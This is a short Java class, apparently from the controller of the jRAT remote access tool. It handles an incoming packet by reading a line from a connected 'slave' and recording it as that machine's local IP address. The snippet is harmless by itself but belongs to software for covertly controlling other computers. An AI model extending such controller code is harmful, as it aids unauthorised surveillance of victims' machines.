package jrat.controller.packets.incoming;

import jrat.controller.Slave;

import java.io.DataInputStream;

public class Packet12InitLocalAddress extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String raw = slave.readLine();
		slave.setLocalIP(raw);
	}

}
